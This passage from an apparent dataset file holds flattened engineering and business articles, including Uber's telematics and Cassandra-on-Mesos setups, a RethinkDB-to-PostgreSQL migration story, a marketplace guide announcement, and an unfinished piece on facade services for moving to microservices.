597]"
414,training-dataset/engineering/133.txt,engineering,How Uber Engineering Increases Safe Driving with Telematicsby Andrew Beinstein   Ted Sumers  Across the globe  nearly 1 250 000 people die in road crashes each year   At Uber  we re determined to decrease this number by raising awareness of driving patterns to our partners   In fact  an entire team at Uber focuses on building technology to encourage safer driving  On Uber Engineering s Driving Safety team  we write code to measure indicators of unsafe driving and help driver partners stay safe on the road  We measure our success by how much we can decrease car crashes  driving related complaints  and trips during which we detect unsafe driving   Today we use harsh braking and acceleration as indicators of unsafe driving behavior  Harsh braking is highly correlated to unsafe behaviors like tailgating  aggressive driving  and losing focus on the road  For example  research from Progressive  a car insurance provider  has shown that harsh braking is a leading indicator for predicting future crashes  To detect these indicators of unsafe driving in the first place  we start with a few simple engineering problems   How Do We Measure Speed   Before we can measure abrupt vehicle movement  we need to measure speed  And to understand speed  we have to understand how GPS works  Put simply  GPS is a system of 24 active satellites that orbit the Earth  The GPS receiver derives its position by determining its distance from at least four satellites   The simplest way of deriving speed from position is by measuring the difference between two consecutive positions  If you know a location is at time   and and time   the average speed between those locations is   This value will approach the true speed as the frequency of measurements increases  While simple to implement  this method depends on GPS positional accuracy  which can be unreliable in urban environments  particularly around tall buildings   We get a more accurate measurement of speed by using the Doppler shift  which occurs when a signal s transmitter moves relative to its receiver  Fire truck sirens often illustrate the Doppler shift  the transmitter is the siren  and the receiver is your eardrum  The perceived pitch of the siren increases as the truck moves toward you  and decreases as the vehicle moves away   GPS receivers on driver partner phones work in a similar way  The receiver  that is  the phone  is either moving toward or away from a satellite  The receiver s velocity can be accurately derived from the difference between the expected signal s frequency and its actual one  GPS can also take a measure of speed by looking at the rate at which the waves that carry the GPS signal change  this is called time difference carrier positioning    Measuring Brakes and Accelerations  The next step is to derive brakes and accelerations from vehicle speed  Acceleration is defined as the rate of change of velocity  Therefore  once we measure the vehicle s speed  we can determine the magnitude of the acceleration by calculating the derivative   To start  the Uber Data team extracted a large set of GPS data into a hosted Jupyter notebook with the goal of transforming any arbitrary window of GPS data into a feature vector comprised of summary statistics  We did this by first extracting acceleration and braking events from the time series GPS data  and then by computing summary statistics on the observed events   The process of extracting braking events from time series speed data is easiest visualized   Once we had a series of braking and acceleration events  we computed a variety of descriptive statistics such as   The fraction of braking events exceeding 2 m s     The fraction of braking events exceeding just over 3 m s   7 mph   the threshold set by Progressive for a  hard brake  event   The maximum  90 th percentile  and median magnitude of all accelerations   Feature Engineering  So  how do we make sense of these features  In particular  we wanted to know which ones reliably indicated unsafe driver behavior  Fortunately  we had a large corpus of training data  rider feedback  We obtained a set of positive labels from rider feedback trips with low passenger ratings indicating dangerous driving behavior and with this set trained a basic machine learning model to validate that our feature set had predictive power on bad rider experiences   In this case  we used scikit learn s logistic regression   Specifically  we used an L2 regularized regression and evaluated the model s ROC AUC  iterating on the feature set until we had a satisfactory model   Processing Data at Scale  Finally  we had to put these learnings in production and efficiently process GPS data at Uber s scale   The above diagram shows how partner phone data flows through our architecture  We process and store GPS data from trips in our Trips Service  Trip data is then published to a Kafka topic and consumed by many other internal services  one of which is our Vehicle Movement Processor  This service produces a feature vector of driving behavior  num_hard_brakes  peak_accel_magnitude  etc  to yet another Kafka topic to be consumed by more services  All data from Kafka eventually lands into HDFS for long term storage  We can run batch analysis from our HDFS cluster using tools like Hive and Spark  For example  we can compute daily city level averages for hard brakes  Then  we index this data with our Elasticsearch cluster for low latency reads and expose a simple API through the Vehicle Movement Gateway   This architecture has a number of advantages   The architecture is fault tolerant   Each service is deployed across multiple hosts in multiple datacenters  and each data store is distributed in nature   The architecture scales horizontally   We monitor the performance of each component in the architecture and can easily add more nodes if we experience high load   The architecture is flexible  Any service can start consuming from one of our Kafka topics without compromising the health of the system   This article shows one example of the work we are doing to improve safety through engineering  Curious to know more about what we are up to  If you re interested in machine learning and signal processing  distributed systems  or building delightful products  look at Uber s engineering openings in safety and telematics     Source  World Health Organization  Global status report on road safety 2015   Andrew Beinstein is a software engineer on Uber Engineering s Driving Safety team  and wrote this article with Ted Sumers  a software engineer on the Sensing   Perception team,"[414 673 1086 1016 1300 281 952 1351 778 500 1010]"
424,training-dataset/engineering/1297.txt,engineering,my personal experience   SageMathCloud BlogIntroduction  Initially motivated by the shutdown of the RethinkDB company  and the licensing situation with RethinkDB  a blocker for certain parts of my business   I worked very hard for two months to completely rewrite the realtime and database components of SageMathCloud  SMC  to use PostgreSQL instead of RethinkDB  initially motivated by this discussion in Hacker news  I battled with and used RethinkDB heavily since May 2015  and I ve used PostgreSQL heavily as well  with production data  rewriting all the same queries in both systems  so I m in a good position to compare them for my use case  the site SMC    This is my story  It s a personal comparison  with NO BENCHMARKS or hard data you could reproduce  It s what I would tell you if we were talking by the water cooler   Summary   I m very happy with the rewrite   Everything is an order of magnitude more efficient using PostgreSQL than it was with RethinkDB   It is much easier to do exploratory queries of our data using PostgreSQL than it was with RethinkDB  PostgreSQL is much more expressive than ReQL  has a massive number of built in functions  so we are making much better use of our data  With RethinkDB  often we just ended up greping through the latest database dump   PostgreSQL is  statically typed   whereas RethinkDB had no type or schema enforcement at all  explicit clear typing improved the quality and robustness of our application   We are saving  800 month      due to reduced CPU and disk space requirements   I had no clue that RethinkDB would be Apache licensed in February 2017   A Mathematician s Apology  This post is probably going to make some people involved with RethinkDB very angry at me     williamstein for the best interest of rethinkdb community project  and especially if you respect the community and ex team members trying hard  please do not sway the community like this   and   williamstein can you delete your previous post    Not listening to users is perhaps not the best approach to building quality software  In Slava s postmortem  he says    People wanted RethinkDB to be fast on workloads they actually tried  rather than  real world  workloads we suggested  For example  they d write quick scripts to measure how long it takes to insert ten thousand documents without ever reading them back  MongoDB mastered these workloads brilliantly  while we fought the losing battle of educating the market     Slava  With SageMath we have had many very intense technical and other discussions with epic arguments back and forth  The one thing we don t do is tell people not to even try to criticize our design choices  bring it on  Obviously  the Linux kernel is similar  and it is very successful   I m writing this blog post partly because I ve said many positive things about RethinkDB  Really  what I love is the problems that RethinkDB solved  and where I believed RethinkDB could be 2 3 years from now if brilliant engineers like Daniel Mewes continued to work fulltime on the project  I don t care so much that problems are solved using a particular piece of software  For example  every component of SMC has been rewritten multiple times   I ve thrown away tens of thousands of lines of code  I care about solutions  not glorifying a particular piece of code for its own sake  Hence this post   I can only hope that any devs who are really  really serious about RethinkDB having a future would listen to users  and hence will appreciate this post  But I m also prepared to be hated for not staying silent   Realtime web applications  There are many approaches to writing  realtime  web applications  i e   event driven applications involving simultaneous multiple users  with the application updating quickly in response to what users do  After learning React js and rewriting a lot of the frontend of SMC using React  I wanted to use a similar reactive architecture on the backend  where each component of the system listens for changes in state  the database   and reacts to it  In early 2015  I also wanted something like Facebook s GraphQL  but there were no available implementation yet   RethinkDB lets clients listen for changes in state to the database  and react to them  It was advertised as  production ready  in 2015  so I spent months rewriting SMC so it would use RethinkDB as the backend database  Before that  I was using Cassandra  and only making very simple use of the database  with all realtime functionality done at the application level in memory  so not using the database   that architecture worked OK  but there was a huge range of functionality I wanted to implement which was impossible to do with this approach  without introducing a message queue  Also  Cassandra was a bad fit for my data  and talking with the Datastax people on the phone about their pricing really scared me   I spent the summer of 2015 rebuilding SMC on React   RethinkDB  with the RethinkDB rewrite being many  many months of hard work and debugging  basically from May 2015 to July 2016  I hit critical bugs that would crash RethinkDB in some edge case  which the RethinkDB devs would always fix  I also encountered a lot of painful scalability and performance issues  which I fixed by tedious benchmarking  debugging  studying logs  and introducing client side workarounds  e g   idle timeouts on changefeeds   In July 2016  using RethinkDB become pretty stable   Jonathan Lee  a computer science student working with me on SMC in Summer 2015  advised me against using RethinkDB due to performance issues  In particular  he pointed out this 2015 blog post  in which RethinkDB is consistently 5x 10x slower than MongoDB  I ignored Jonathan s advice  because I believed RethinkDB would catch up within a year or two  I thought they would obsess over benchmarks now that they were production ready  I didn t realize it would take nearly a year for them to fix the bugs in their automatic failover and stabilize the current features  I had a nagging feeling deep down that Jonathan was right and I was making a big mistake  but I ignored it   A RethinkDB employee told me he thought I was their biggest user in terms of how hard I was pushing RethinkDB   Using RethinkDB up until July 2016 was painful  I remember so many times doubling and doubling again the cpu s in the RethinDB nodes  in order to handle the load from  say  10K changefeeds  Maybe I just needed to be  educated  and was using RethinkDB incorrectly  Everything was a battle  even trying to do backups was really painful  and eventually we gave up on making proper full consistent backups  instead  backing up only the really important tables via complete JSON dumps   We also had a lot of issues with disk usage   Around July 2016  I finally got a setup using RethinkDB to be stable and working  I finally learned to really appreciate Docker and Kubernetes  since they make it very easy to tweak dials to scale things up and down  Also Harald Schilly suggested using  RethinkDB proxy nodes   inspiring this section of the RethinkDB docs  These are RethinkDB nodes that don t store any data on disk  but do the hard work of processing and serving changefeeds    The proxy node can do some query processing itself  reducing CPU load on database servers    We ended up spinning up a Kubernetes cluster with 20 rethinkdb proxy webserver pods  in addition to our 6 node RethinkDB cluster  and we could handle our load  Even then  the proxy nodes would often run at relatively high cpu usage  I never understood why  In fact  they were the only part of the entire SMC architecture whose high CPU usage I didn t understand  By training and profession  I m a pure mathematics researchers and lover of open source software  so I m used to trying to understand how and why things work the way they do  but I never understood this   When the RethinkDB company shut down  I initially decided to just wait and see what happened  maybe for a year or two  since our site was working fine with the many nodes mentioned above  I also didn t realize how much money we were wasting on this setup   Then I was in a very long and intense meeting with a potentially major customer for an on premises install  and one of their basic requirements was  no AGPL in the stack   With the RethinkDB company gone  there was no way to satisfy that requirement  and my requests went nowhere at the time   I had assumed that the speed would increase substantially due to focused work of Daniel Mewes during 2017  However  my understanding is that he went to work fulltime at Stripe  and will not be working on RethinkDB much  I also worried that the license situation wouldn t be resolved   Worrying about licensing is what PG would call a sitcom idea  1    it feels like doing useful work  but in actuality it makes no difference whatsoever    though as we all know now it was just resolved   So in early December 2016  I decided enough was enough  and I started rewriting our Rethink code  which is 5600 lines of CoffeeScript  to instead use PostgreSQL  I spent the first week making prototypes and benchmarks using the LISTEN NOTIFY TRIGGER functionality of PostgreSQL  For me  I realized the problem should not be  use some cool tech   but instead  can I use this tech to solve my customer problems   Even if LISTEN NOTIFY TRIGGER are much lower level  and take a lot more work and thought than RethinkDB changefeeds  I don t care if the end result is better      I wonder what will happen to products like SageMathCloud using RethinkDB now that the company is gone away     nchelluri on Hacker News   PostgreSQL  I learned from this discussion in Hacker news that PostgreSQL has some basic building blocks for implementing something like RethinkDB changefeeds  Searching online for uses of NOTIFY LISTEN yields some relatively simple  but clear   demos  which I was very thankful for  I did lots of benchmarks  and came to the conclusion that this could work   I knew exactly what I needed to accomplish  since I had it all running on top of RethinkDB in production  So no design was really needed  The problem was clear  Do exactly the same thing  but using PostgreSQL s LISTEN NOTIFY and triggers instead   Regarding PostgreSQL  I ve used it off and on since the late 1990s  in fact  PostgreSQL started at Berkeley the same year I started graduate school there    There have been steady but major improvements to PostgreSQL over the years  including very good JSON document support  replication  and clearly somebody spent work making their LISTEN NOTIFY functionality fast  Thank you  whoever you are   I didn t seriously consider MySQL since it doesn t have LISTEN NOTIFY  and is also GPL licensed  whereas PostgreSQL has a very liberal license   After running tests and studying the API  I estimated I could rewrite SMC on top of PostgreSQL in  one month of focused work    Implementation  I made a plan and spent all December rewriting SMC on top of PostgreSQL  Indeed it took exactly a month of focused work to do the basic rewrite   The design I used was to setup a small number of LISTEN NOTIFY channels  which would listen for changes on a table  and send the primary key and optionally other small columns to each connected webserver  This meant that the total number of triggers and LISTEN NOTIFY channels that the database manages is quite small   hundreds at most  When a webserver client gets a notification  it then decides whether it is interested in that record  and if so does a SELECT back to the database for the rest of the data  which it then sends out to clients   The problem of deciding whether to do the further select currently involves an O N  call of a bunch of functions that check equality  it could be done much more efficiently with a Bloom filter or hash table    In moments of frustration at the CPU usage of RethinkDB  I had imagined implementing something like the above on top of RethinkDB  but decided not to  since it is literally doing exactly what RethinkDB must be doing  When I started vaguely thinking through the details it seemed hard and complicated  and I was worried that it would be even less efficient than RethinkDB  Last August 2016  when I had dinner with Daniel Mewes  he surprised me by telling me that the RethinkDB proxy nodes were all receiving  and presumably doing something with  all of the data for all updates to all tables that had any changefeeds  Maybe this was why things were inefficient   In any case  I wrote code that automates creation of all triggers to do listen notify  I went through my tables  and made sure to implement enough changefeed style functionality so that they did everything I need  Also  since I actually knew what I was building ahead of time  and was scared of having hard to debug problems in production   I wrote a large number of unit tests   There was also a complicated  graph style  query of  all collaborators on projects  that caused a lot of trouble with RethinkDB  often taking 10 seconds for certain users with lots of projects  e g   me with over 500 projects   It s a query that is hard to express efficiently  involving a join over two tables  Also  RethinkDB couldn t do a changefeed on that query  so when the projects that I user collaborated on changed  I would have to kill the changefeed and recreate it  When rewriting everything  I decided to just do things right if possible  and came up with a single data structure that properly tracked all projects and collaborators of a given user by just watching the whole accounts and projects tables  and properly updating some data structures  The code is in ProjectAndUserTracker here  and it works very well in practice  Obviously  again  this same code could have been written on top of RethinkDB  and it would have helped a lot   In any case  to build my application on PostgreSQL  many new small problems absolutely had to be solved  many taking a day of concentration  Rewriting all the code from scratch did clean it up a lot   Also  I hope to build multimaster async replication on the above changefeed functionality  This will be important when SMC is geographically distributed  I also have plans to do a partial multi master async between the main public SMC and individual docker images that users run offline  which provide a genuine full offline mode  and also provide simultaneous editing of files  with multiple cursors etc    but with all compute happening on the user s local machine in a docker container  which has its own small local PostgreSQL instance  But that s for 2018   Migration  Next  in early January  I started the process of writing code to migrate all the data from RethinkDB to PostgreSQL  with minimal downtime  so one big migration  then incremental updates   I thought this would take a few hours  but it ended up taking nearly a month  I have a lot of data   one table had 150 million records in it  Another obstruction is that PostgreSQL is statically typed  whereas RethinkDB is very much not  and this exposed tons of subtle issues in my data  In addition  with PostgreSQL it was obvious and trivial to impose conditions on my data  e g   all email addresses in the accounts table are unique  so of course I imposed constraints    due to race conditions there were multiple accounts with the same email address in my RethinkDB data  so I had to write some  scary  code to deal with that  I also had to deal with things like null bytes in JSON strings  and timestamps in nested JSON data structures  and many other issues  I used a combination of relational columns and JSONB in some cases  which I ll revisit later   I did miss one critical subtle bug regarding timestamp precision in the PostgreSQL Node js driver  which would cost me days of painful work to debug   Comparing speed  As I migrated my data from PostgreSQL  I found myself in a unique position  I had years of production real world data in both RethinkDB and PostgreSQL  By this point  I knew both query languages pretty well  I did a lot of random queries of my data  sitting in both DB s  and looked at the resulting times  PostgreSQL was faster  usually 5x faster  sometimes only 2x faster  and often even 10x faster  Definitely  the act of writing queries in SQL was much faster for me than writing ReQL  despite me having used ReQL seriusly for over a year  There s something really natural and powerful about SQL  And  holy crap  PostgreSQL has a lot of built in functions that you can use in your queries  and you can add more via Python and many other languages  I haven t done this yet  but I have dreams of hooking Sage into PostgreSQL    I am not providing my data or one single proof of my claims about speed  Again  this is watercooler talk  I have a couple hours to share my experiences with the world  and then I have to get back to work   Backups  which involve dumping full tables from the database  were an order of magnitude faster with PostgreSQL   The total disk space usage was an order of magnitude less  800GB versus 80GB    some of our tables had a lot of TEXT fields  and PostgreSQL automatically compresses those  which was a huge win  Also   to be fair  we had no redundancy with PostgreSQL  whereas 3x redundancy with RethinkDB  SSD disk space on GCE is expensive  so the reduction in disk usage is saving us a lot of money   I  and the other SMC devs  run a lot of single user RethinkDB databases for development purposes  PostgreSQL tends to use  at least  an order of magnitude less RAM to do the same thing   In math software like Sage  I have seen these  order of magnitude differences in speed  with many implementations of algorithms over the years  Often the first Python implementation of an algorithm is nice and illustrative and works  then you re implement it in Cython  change algorithms  etc   and end up with something that is 100x faster  This is just the normal experience I ve had with math software  I imagine databases are similar  Using 10x more disk space means 10x more reading and writing to disk  and disk is  way more than  10x slower than RAM   Connection pooling  I spent a huge amount of time worry about connection pooling with RethinkDB to get better concurrency  finally just writing my own  With PostgreSQL I don t even bother  and instead each web server just has exactly one connection to PostgreSQL  and that is of course served by exactly one single threaded process in the PostgreSQL server  The root problem is  make results fast for users   not  have a lot of concurrent connections   By optimizing everything  the load on the database and the web servers is now overall very low  and can easily be handled over a single connection  There simply is no need for a connection pool for my application  since PostgreSQL is so fast  It s also actually really nice that one client web server can t slow down the whole database   Going live  things started to fail spectacularly  After all the awesome microbenchmarking above  I expected that when we went live it would be way more efficient than RethinkDB  On a nervous quiet Saturday morning  we switch the live production site over  and everything looked reasonably good for a while   Then things started to fail spectacularly   Every connection to the database was pegged at 100  cpu doing SELECT queries  I didn t know what to do  It made no sense  I made the database server faster and spun up way more web servers  which basically worked  but seemed weird  I panicked for a while  mulled over the problem  and kept raising the number of web servers  etc  This sucked  I thought for a while the only solution would be to greatly reduce the number of SELECT s in the changefeeds  Recall that changefeeds work by doing a SELECT to get more data when necessary   After convincing myself not to give up and shut down SMC for good  I calmed down and studied a lot of logs and found a PostgreSQL query that was taking 15s sometimes and locking the other queries  It was a query involving a subquery  it finds all collaborators of a user   it s exactly the one mentioned above that I couldn t make a changefeed on with RethinkDB  I then tried an instance of this query directly in psql  and it took only a few milliseconds  Weird  OK  I tried it with some other parameters  and it suddenly took 15 seconds at 100  CPU  with PostgreSQL doing some linear scan through data  Using EXPLAIN I found that with full production data the query planner was doing something idiotic in some cases  I learned how to impact the query planner  and then this query went back to taking only a few milliseconds for any input  With this one change to influence the query planner  to actually always use an index I had properly made   things became dramatically faster  Basically the load on the database server went from 100  to well under 5    The Node js PostgreSQL driver  The Node js PostgreSQL driver claims the native bindings provide a  20 30  increase in parsing speed   For my workload  especially reading BYTEA data  blobs   the speed increase is 600   This was another observation I made by looking at log files   With all these optimizations  the load on the web servers and database  even when we have 600  simultaneous users  is barely anything   Open source  All the code I wrote related to this blog post is   ironically   AGPL  Basically it is everything that starts with postgres  here   SageMath  Inc  owns all the copyright  so we could license under something else if somebody is serious about wanting to create a nodejs project on top of PostgreSQL to provide changefeeds  I m too busy with my company to do that  but I would be supportive   Conclusion  I have often said that  RethinkDB is the first database I ever loved   In fact  it s the reactive approach to databases based on changefeeds that I love  just like I love using React js   I still very much love trying to solve this problem  If I were in charge of the RethinkDB project  I would delete much of the code and instead focus on the problem   changefeeds  and build solutions on top of PostgreSQL  and maybe other databases   I m very thankful for the RethinkDB project for giving me the opportunity to spend time using this approach to DB s  so I know how it feels   Regarding automatic failover and multiple nodes  what really matters is that the site works for users  Google Compute Engine is so reliable that a single VM tends to stay up for hundreds of days      or if it goes down  it comes back very quickly  PostgreSQL also now has a very good Master Slave story  It s much more likely that of 6 nodes  something will go wrong with one of them  and though RethinkDB automatically fails over  it can take a while and leave clients in bad shape  Also  at our current rate of growth  and with current load  it ll be a long time until one VM isn t sufficient to serve everything  our workload is 90  read and 10  write  so PostgreSQL Master slave would also very effective for us for scaling out   In conclusion  I hope that this post tells you as much about SMC as it does about databases  Other take aways    focus more on the real problem    prepare to throw lots of code away  writing the first version s  is not wasted effort  it brings essential insight   once you know what the code will do  it s a lot easier to write it in a way that supports testing and refactoring   open source is critical for solving deep problems   don t be afraid to try alternative architecture  Discuss Hacker News,"[424 1295 778 1106 699 92 1373 520 673 1336 61]"
451,training-dataset/business/956.txt,business,Our Guide to Marketplaces  now summarized in a deckOur Guide to Marketplaces  now summarized in a deck  Six months ago  we published A Guide to Marketplaces  Marketplace companies comprise an important part of our portfolio and investment thesis and we recognized the shortage of content out there specifically geared toward marketplace startups  We compiled a lot of the insights we learned from working with great marketplace companies and wrote a handbook   It was our first experience with this kind of project and we weren t sure what the response would be  We ve been so surprised by the reception  both the handbook and marketplace KPI dashboard have been downloaded over 20 000 times  The guide has been translated into Japanese and a robot even took on the handbook on Medium  we re happy to report that our version came out on top    Today  we re announcing the release of the Guide to Marketplace deck  where we summarized the original guide into a series of slides for a faster read and reference   You can download the slide deck here  And if you re interested in the full version of the handbook  it s available as a PDF or ePub   Special thanks to Grant Ognibene who has been interning with us over the past couple of months   he did much of the curation,"[451 572 1300 1095 1373 1408 61 1393 1405 206 281]"
500,training-dataset/engineering/1322.txt,engineering,How Uber Manages a Million Writes Per Second Using Mesos and Cassandra Across Multiple DatacentersWednesday  September 28  2016 at 8 59AM  If you are Uber and you need to store the location data that is sent out every 30 seconds by both driver and rider apps  what do you do  That s a lot of real time data that needs to be used in real time   Uber s solution is comprehensive  They built their own system that runs Cassandra on top of Mesos  It s all explained in a good talk by Abhishek Verma  Software Engineer at Uber  Cassandra on Mesos Across Multiple Datacenters at Uber  slides    Is this something you should do too  That s an interesting thought that comes to mind when listening to Abhishek s talk   Developers have a lot of difficult choices to make these days  Should we go all in on the cloud  Which one  Isn t it too expensive  Do we worry about lock in  Or should we try to have it both ways and craft brew a hybrid architecture  Or should we just do it all ourselves for fear of being cloud shamed by our board for not reaching 50 percent gross margins   Uber decided to build their own  Or rather they decided to weld together their own system by fusing together two very capable open source components  What was needed was a way to make Cassandra and Mesos work together  and that s what Uber built   For Uber the decision is not all that hard  They are very well financed and have access to the top talent and resources needed to create  maintain  and update these kind of complex systems   Since Uber s goal is for transportation to have 99 99  availability for everyone  everywhere  it really makes sense to want to be able to control your costs as you scale to infinity and beyond   But as you listen to the talk you realize the staggering effort that goes into making these kind of systems  Is this really something your average shop can do  No  not really  Keep this in mind if you are one of those cloud deniers who want everyone to build all their own code on top of the barest of bare metals   Trading money for time is often a good deal  Trading money for skill is often absolutely necessary   Given Uber s goal of reliability  where out of 10 000 requests only one can fail  they need to run out of multiple datacenters  Since Cassandra is proven to handle huge loads and works across datacenters  it makes sense as the database choice   And if you want to make transportation reliable for everyone  everywhere  you need to use your resources efficiently  That s the idea behind using a datacenter OS like Mesos  By statistically multiplexing services on the same machines you need 30  fewer machines  which saves money  Mesos was chosen because at the time Mesos was the only product proven to work with cluster sizes of 10s of thousands of machines  which was an Uber requirement  Uber does things in the large   What were some of the more interesting findings   You can run stateful services in containers  Uber found there was hardly any difference  5 10  overhead  between running Cassandra on bare metal versus running Cassandra in a container managed by Mesos   Performance is good  mean read latency  13 ms and write latency  25 ms  and P99s look good   For their largest clusters they are able to support more than a million writes sec and  100k reads sec   Agility is more important than performance  With this kind of architecture what Uber gets is agility  It s very easy to create and run workloads across clusters   Here s my gloss of the talk   In the Beginning  Statically partitioned machines across different services   50 machines might be dedicated to the API  50 for storage  etc  and they did not overlap   In the Now  Want run everything on Mesos  including stateful services like Cassandra and Kafka  Mesos is Data Center OS that allows you to program against your datacenter like it s a single pool of resources  At the time Mesos was proven to run on 10s of thousands of machines  which was one of Uber s requirements  so that s why they chose Mesos  Today Kubernetes could probably work too  Uber has build their own sharded database on top of MySQL  called Schemaless  The idea is Cassandra and Schemaless will be the two data storage options in Uber  Existing Riak installations will be moved to Cassandra   A single machine can run services of different kinds   Statistically multiplexing services on the same machine can lead to needing 30  fewer machines  This is a finding from an experiment run at Google on Borg   If  for example  one services uses a lot of CPU it matches well with a service that uses a lot of storage or memory  then these two services can be efficiently run on the same server  Machine utilization goes up   Uber has about 20 Cassandra clusters now and plans on having 100 in the future   Agility is more important than performance  You need to be able manage these clusters and perform different operations on them in a smooth manner   Why run Cassandra in a container and not just on the whole machine  You want to store hundreds of gigabytes of data  but you also want it replicated on multiple machines and also across datacenters  You also want resource isolation and performance isolation across different clusters  It s very hard to get all that in a single shared cluster  If you  for example  made a 1000 node Cassandra cluster it would not scale or it would also have performance interference across different clusters     In Production   20 clusters replicating across two data centers  west and east coast   Originally had 4 clusters  including China  but since merging with Didi those clusters were shut down    300 machine across two data centers  Largest 2 clusters  more than a million writes sec and  100k reads sec One of the clusters is storing the location that is sent out every 30 seconds by both the driver and rider apps   Mean read latency  13 ms and write latency  25 ms  Mostly use LOCAL_QUORUM consistency level  which means strong consistency   Mesos Backgrounder  Mesos abstracts CPU  memory  and storage away from machines   You are not looking at individual machines  you are looking at and programming to a pool of resources   Linear scalability  Can run on 10s of thousands of machines   Highly available  Zookeeper is used for leader election amongst a configurable number of replicas   Can launch Docker containers or Mesos containers   Pluggable resource isolation  Cgroups memory and CPU isolator for Linux  There s a Posix isolator  There are different isolation mechanisms for different OSes   Two level scheduler  Resources from Mesos agents are offered to different frameworks  Frameworks schedule their own tasks on top of these offers   Apache Cassandra Backgrounder  Cassandra is a good fit for uses cases at Uber   Horizontally scalable  Reads and writes scale linearly as new nodes are added   Highly available  Fault tolerance with tunable consistency levels   Low latency  Getting sub millisecond latencies within the same datacenter   Operationally simple  It s a homogenous cluster  There s no master  There are no special nodes in the cluster   Sufficiently rich data model  It has columns  composite keys  counters  secondary indexes  etc  Good integration with open source software  Hadoop  Spark  Hive all have connectors to talk to Cassandra   Mesosphere   Uber   Cassandra   dcos cassandra service  Uber worked with Mesosphere to produce mesosphere dcos cassandra service   an automated service that makes it easy to deploy and manage on Mesosphere DC OS   At the top is the Web Interface or the Control Plane API  You specify how many nodes you want  how many CPUs you want  specify a Cassandra configuration  then submit it to the Control Plane API   Using the deployment system at Uber it launches on top of Aurora  which is used to run stateless services  it s used to bootstrap the dcos cassandra service framework   In the example the dcos cassandra service framework has two clusters that talk to a Mesos master  Uber uses five Mesos masters in their system  Zookeeper is used for leader election   Zookeeper is also used to store framework metadata  which tasks are running  Cassandra configurations  health of the cluster  etc   Mesos agents run on every machine in the cluster  The agents provide the resources to the Mesos master and the master doles them out in discrete offers  Offers can be either accepted or rejected by the framework  Multiple Cassandra nodes could run on the same machine   Mesos containers are used  not Docker  Override 5 ports in configuration  storage_port  ssl_storage_port  native_transport_port  rpcs_port  jmx_port  so multiple containers can be run on the same machine  Persistent volumes are used so data is stored outside the sandbox directory  In case Cassandra fails the data is still in the persistent volume and is offered to the same task if it crashes and restarts  Dynamic reservation is used to make sure resources are available to relaunch a failed task   Cassandra Service Operations Cassandra has an idea of a seed node that bootstraps the gossip process for new nodes joining the cluster  A custom seed provider was created to launch Cassandra nodes which allows Cassandra nodes to be rolled out automatically in the Mesos cluster  The number nodes in a Cassandra cluster can be increased using a REST request  It will start the additional nodes  give it the seed nodes  and bootstraps additional Cassandra daemons  All Cassandra configuration parameters can be changed  Using the API a dead node can be replaced  Repair is needed to synchronize data across replicas  Repairs are on the primary key range on a node by node basis  This approach does not affect performance  Cleanup removes data that is not needed  If nodes have been added then data will be moved to the new nodes so cleanup is required to delete the moved data  Multi datacenter replication is configurable through the framework   Multi datacenter support Independent installations of Mesos are setup in each datacenter  Independent instances of the framework are setup in each datacenter  The frameworks talk to each other and periodically exchange seeds  That s all that is needed for Cassandra  By bootstrapping the seeds of the other datacenter the nodes can gossip the topology and figure out what the nodes are  Round trip ping latency between data centers is 77 8 ms  The asynchronous replication latency for P50   44 69 ms  P95  46 38ms  P99  47 44 ms   Scheduler Execution The scheduler execution is abstracted into plans  phases  and blocks  A scheduling plan has different phases in it and a phase has multiple blocks  The first phase a scheduler goes through when it comes up is reconciliation  It will go out to Mesos and figure out what s already running  There s a deployment phase that checks if the number of nodes in the configuration are already present in the cluster and deploy them if necessary  A block appears to be a Cassandra node specification  There are other phases  backup  restore  cleanup  and repair  depending on which REST endpoints are hit   Clusters can be started at a rate of one new node per minute  Want to get to 30 seconds per node startup time  Multiple nodes can not be started concurrently in Cassandra  Usually give 2TB of disk space and 128GB of RAM are given to each Mesos node  100GB is allocated for each container and 32GB of heap is allocated for each Cassandra process   note  this was not clear  so may have the details wrong  The G1 garbage collector is used instead of CMS  it has much better 99 9th percentile latency  16x  and performance without any tuning     Bare Metal vs Mesos Managed Clusters  What is the performance overhead of using containers  Bare metal means Cassandra is not running in a container   Read latency  There s hardly any difference  5 10  overhead  On bare metal on average was  38 ms versus  44 ms on Mesos  At P99 bare metal was  91 ms and on Mesos P99 is  98 ms   Read throughput  Very little difference   Write latency  On bare metal on average was  43 ms versus  48 ms on Mesos  At P99 bare metal was 1 05 ms and on Mesos P99 is 1 26 ms   Write throughput  Very little difference,"[500 393 673 1336 1403 1300 281 1016 1192 1086 952]"
520,training-dataset/engineering/1254.txt,engineering,Simplifying Your Transition from Macro to Microservices   via  codeshipThis is the first part in my series of articles in moving from macro to microservices  Here  I ll present first the reasoning as to why a developer or manager would make such a move  Later posts in the series will provide code examples and procedures for building your own solution and  finally  creating your whole environment where you gradually replace your macroservice with a bundle of microservices   Why the Transition from Macro to Micro Can Be Intimidating  One of the more frequent problems I ve come across when developing large systems is that the technology that was originally used has started to become obsolete and the learning curve to add new features is a long one  This situation requires you to learn a lot about the system that you are about to meddle with   Doing a rewrite of the system is one idea  but especially with larger systems  that opens a can of worms of its own  Not only are you likely to introduce new bugs on top of existing ones  you re stuck temporarily maintaining two systems  Having your developers work on the new system will  possibly  pay off later when it s online  but until that happens  they re an expense   A large macroservice also tends to demand a longer learning curve  modules impact other modules  and adding functionality usually requires you to have a good understanding of the system you are about to modify   For example  a data exporting functionality might be easy to create in theory and only require a few days or a week s worth of programming in practice  However  people who are unfamiliar with the underlying system might end up spending several weeks just to find all the nooks and crannies that ll be impacted by their addition  This leads to systems being dependent on people that are familiar with them  which makes outsourcing a practical impossibility   Bridge the Gap with Facade Services  The main problem with a particular macroservice system that I was working with was its obsolete tech  There were some parts of it that originated from a 10 year old design  and dependencies on old systems were high  It needed to be constantly maintained while adding new features or changing them  making it a mess to handle   Since this system had a lot of old dependencies  it also required some libraries that were no longer maintained or that had had their functionality changed over the years  This forced us to keep the old versions or spend valuable time updating the system to take advantage of new libraries  which often meant doing work that offered no measurable value   So on to facade services   Facade services are often used when you have a complex underlying system and need to open it up for other services to use  but you don t want to open the entire endpoint  So you create a proxy interface instead  which offers just the functionality you want it to  For example  you might create a REST service to read data from a SOAP system   My first experience transitioning a system into a facade service was when we did just that  We had a macroservice directly tied up to an HTML frontend  and we needed to have a way to open it up for a mobile app to use   In this case  we already had an interface that was open to the world  so the idea for the facade service was to initially create a simple proxy that only relayed the requests and didn t offer any other functionality   Creating something like this and having a load balancer use it as a primary interface and the actual API as secondary allows easy testing until the proxy service is stable  After this is done  it becomes a lot easier to replace old functionalities with new code  as well as add new features to the API that didn t exist before   New functionality 